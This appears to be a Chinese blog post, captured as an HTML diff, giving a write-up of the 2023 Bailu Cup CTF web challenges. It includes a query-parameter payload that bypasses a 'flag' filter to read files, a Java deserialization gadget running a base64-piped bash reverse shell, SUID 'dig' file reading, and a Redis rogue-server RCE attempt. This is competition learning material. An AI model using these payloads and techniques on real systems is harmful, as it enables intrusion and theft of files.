@@ -1,0 +1,356 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023柏鹭杯]赛后总结 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023柏鹭杯]赛后总结 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Web WriteUP
+express fs
+首页可以读文件。
+main.js
+const express = require(&quot;express&quot;);
+const fs = require(&quot;fs&quot;)..." />
+    <meta name="keywords" content="赛后总结,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023柏鹭杯]赛后总结
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-11
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/QGeg3Wbqm/" class="post-tag">
+                  # 赛后总结
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-bo-lu-bei-sai-hou-zong-jie.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="web-writeup">Web WriteUP</h1>
+<h2 id="express-fs">express fs</h2>
+<p>首页可以读文件。</p>
+<p>main.js</p>
+<pre><code class="language-java">const express = require(&quot;express&quot;);
+const fs = require(&quot;fs&quot;);
+
+const app = express();
+
+const PORT = process.env.PORT || 80;
+
+app.use('/static', express.static('static'))
+
+app.use((req, res, next) =&gt; {
+  if (
+    [req.body, req.headers, req.query].some(
+      (item) =&gt; item &amp;&amp; JSON.stringify(item).includes(&quot;flag&quot;)
+    )
+  ) {
+    return res.send(&quot;臭黑客!&quot;);
+  }
+  next();
+});
+
+app.get(&quot;/&quot;, (req, res) =&gt; {
+  try {
+    res.setHeader(&quot;Content-Type&quot;, &quot;text/html&quot;);
+    res.send(fs.readFileSync(req.query.file || &quot;index.html&quot;).toString());
+  } catch (err) {
+    console.log(err);
+    res.status(500).send(&quot;Internal server error&quot;);
+  }
+});
+
+app.listen(PORT, () =&gt; console.log(`express server listening on port ${PORT}`));
+
+</code></pre>
+<p>搜了下，没想到是原题<a href="https://forum.butian.net/share/1986">fs.readFileSync的利用</a></p>
+<p><code>app.use</code>不允许传入的请求体、请求头、参数包含&quot;flag&quot;；<code>/</code>下的file参数可以读文件。</p>
+<p>nodejs有个特性，如果传入多个<code>query</code>参数，比如<code>?query=1&amp;query=2&amp;query=3</code>。nodejs在解析这样的参数时，不会用后面的值去覆盖前面的，而是将其作为一个数组保存。</p>
+<p>而<code>fs.readFileSync()</code>可以接受一个URL类型的参数，它可以是一个URL对象或者对应格式的数组。<code>fs.readFileSync()</code>在解析这个URL的时候会自动进行URL解码，所以这时可以用URL编码绕过<code>app.use</code>中对flag的检测。构造一个file协议的URL数组传入，payload如下（对pathname进行二次编码）</p>
+<pre><code>?file[href]=a&amp;file[origin]=1&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=/server/%2566%256c%2561%2567.txt
+</code></pre>
+<h2 id="综合题">综合题</h2>
+<p>这个环境中有三个flag<br>
+<img src="https://skyblu3519.github.io/post-images/1697039601712.png" alt="" loading="lazy"></p>
+<h3 id="1">1</h3>
+<p>上传文件后，view处可以任意文件下载<br>
+<img src="https://skyblu3519.github.io/post-images/1697039621438.png" alt="" loading="lazy"></p>
+<p>根据题目的提示，可以把题目的jar包下载下来（/app/demo.jar），反编译得到源码。</p>
+<p>在Upload.java中找到第一个flag的点<br>
+<img src="https://skyblu3519.github.io/post-images/1697039641436.png" alt="" loading="lazy"></p>
+<p>函数实现了一个异或加密，<code>O0O</code>是密钥，enc_flag1则是经过函数加密再base64编码的内容。</p>
+<p>异或是可逆的，简单写一下解密的代码</p>
+<pre><code>public class Test {
+    public static String enc_flag1 = &quot;UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==&quot;;
+
+    public static String key = &quot;6925cc02789c1d2552b71acc4a2d48fd&quot;;
+
+    public static String decode(String result) {
+        StringBuilder flag = new StringBuilder();
+        byte[] decodedBytes = Base64.getDecoder().decode(result);
+        String decodedString = new String(decodedBytes, StandardCharsets.UTF_8);
+        for (int i = 0, len = decodedString.length(); i &lt; len; i++) {
+            char f = decodedString.charAt(i);
+            char k = key.charAt(i % key.length());
+            char r = (char)(f ^ k);
+            flag.append(r);
+        }
+        return flag.toString();
+    }
+
+    public static void main(String[] args) {
+        System.out.println(decode(enc_flag1));
+    }
+}
+
+</code></pre>
+<p>得到flag<br>
+<img src="https://skyblu3519.github.io/post-images/1697039659733.png" alt="" loading="lazy"></p>
+<h3 id="2">2</h3>
+<p><code>/internalApi/v3.2/updateConfig</code>路由有反序列化功能，<code>Ping</code>反序列化会执行命令。</p>
+<p>直接反序列化命令执行弹个shell出来</p>
+<pre><code class="language-java">Ping p = new Ping();
+p.setCommand(&quot;bash&quot;);
+p.setArg1(&quot;-c&quot;);
+p.setArg2(&quot;{echo,...}|{base64,-d}|{bash,-i}&quot;);
+
+String s = serializeToBase64(p);
+System.out.println(s);
+</code></pre>
+<p>目录下的hint提示flag所在的位置，但是没有权限读。</p>
+<p>使用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>寻找具有suid权限的程序。</p>
+<p>找到了dig命令<br>
+<img src="https://skyblu3519.github.io/post-images/1697039687670.png" alt="" loading="lazy"></p>
+<p>用-f参数读取flag<br>
+<img src="https://skyblu3519.github.io/post-images/1697039696387.png" alt="" loading="lazy"></p>
+<h1 id="没有解出的题">没有解出的题</h1>
+<h2 id="综合3">综合3</h2>
+<p>在读启动命令的时候知道了它启动的配置文件位置<br>
+<img src="https://skyblu3519.github.io/post-images/1697039706548.png" alt="" loading="lazy"></p>
+<p>读这个配置文件可以看到内网Redis服务的信息<br>
+<img src="https://skyblu3519.github.io/post-images/1697039725752.png" alt="" loading="lazy"></p>
+<p>在有了web的shell之后就想怎么去攻击这个Redis。将Java中用于连接Redis的<code>jedis</code>以及其所依赖的<code>slf4j</code>的jar包，上传上去。然后写一个连接测试一下</p>
+<pre><code class="language-java">import redis.clients.jedis.Jedis;
+
+public class RedisConnectionTest {
+    private static final String REDIS_HOST = &quot;172.25.0.10&quot;;
+    private static final int REDIS_PORT = 62341;
+    private static final String REDIS_PASSWORD = &quot;de17cb1cfa1a8e8011f027b416775c6a&quot;;
+
+    public static void main(String[] args) {
+        try (Jedis jedis = new Jedis(REDIS_HOST, REDIS_PORT)) {
+            jedis.auth(REDIS_PASSWORD);
+            String response = jedis.ping();
+
+            if (&quot;PONG&quot;.equals(response)) {
+                System.out.println(&quot;Successfully connected to Redis!&quot;);
+            } else {
+                System.out.println(&quot;Connection to Redis failed!&quot;);
+            }
+        } catch (Exception e) {
+            System.out.println(&quot;Failed to connect to Redis: &quot; + e.getMessage());
+        }
+    }
+}
+</code></pre>
+<p>编译/运行</p>
+<pre><code class="language-shell">javac -cp .:jedis-3.7.0.jar RedisConnectionTest.java
+java -cp .:jedis-3.7.0.jar:slf4j-api-1.7.32.jar:slf4j-simple-1.7.32.jar RedisConnectionTest
+</code></pre>
+<p>测试是可以访问到Redis的。接着尝试读取Redis数据库的内容，发现没有任何记录。</p>
+<p>接下来就是尝试Redis的RCE，搜索之后找到了Redis主从复制RCE相关的内容</p>
+<ul>
+<li><a href="https://blog.csdn.net/Trouble_99/article/details/111561636">Redis未授权访问利用RCE进行漏洞复现</a></li>
+<li>利用工具：
+<ul>
+<li><a href="https://github.com/Dliv3/redis-rogue-server/tree/master">https://github.com/Dliv3/redis-rogue-server/tree/master</a></li>
+<li><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></li>
+</ul>
+</li>
+</ul>
+<p>用的是第一个工具，在远程启动<code>python3 redis-rogue-server.py --server-only</code>，然后用Java程序让Redis执行<code>jedis.slaveof(ROGUE_REDIS_HOST, 21000);</code>。</p>
+<p>有回显，但是没有Redis相关的知识，这个内容也不知道说的是个啥<br>
+<img src="https://skyblu3519.github.io/post-images/1697039793895.png" alt="" loading="lazy"></p>
+<p>最后时间结束，很可惜没有做出来....</p>
+<p>之后补一下Redis相关的内容准备。</p>
+<h2 id="剩下的题目">剩下的题目</h2>
+<p>剩下了三道0解题目<br>
+<img src="https://skyblu3519.github.io/post-images/1697039801402.png" alt="" loading="lazy"></p>
+<p>jdbc知识盲区，直接放弃。</p>
+<p>反序列化就是那种看一眼就明白，但是就是解不出的题。非常害怕<br>
+<img src="https://skyblu3519.github.io/post-images/1697039848594.png" alt="" loading="lazy"></p>
+<p>总之非常害怕</p>
+<p>最后的UAF结果是个PWN....难顶</p>
+<h1 id="总结">总结</h1>
+<p>突击一下Java还是有效果的🙃</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#web-writeup">Web WriteUP</a>
+<ul>
+<li><a href="#express-fs">express fs</a></li>
+<li><a href="#%E7%BB%BC%E5%90%88%E9%A2%98">综合题</a>
+<ul>
+<li><a href="#1">1</a></li>
+<li><a href="#2">2</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%B2%A1%E6%9C%89%E8%A7%A3%E5%87%BA%E7%9A%84%E9%A2%98">没有解出的题</a>
+<ul>
+<li><a href="#%E7%BB%BC%E5%90%883">综合3</a></li>
+<li><a href="#%E5%89%A9%E4%B8%8B%E7%9A%84%E9%A2%98%E7%9B%AE">剩下的题目</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/java-fan-xu-lie-hua-3-cc-lian-6/">
+              <h3 class="post-title">
+                Java反序列化（3）—— CC链6
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
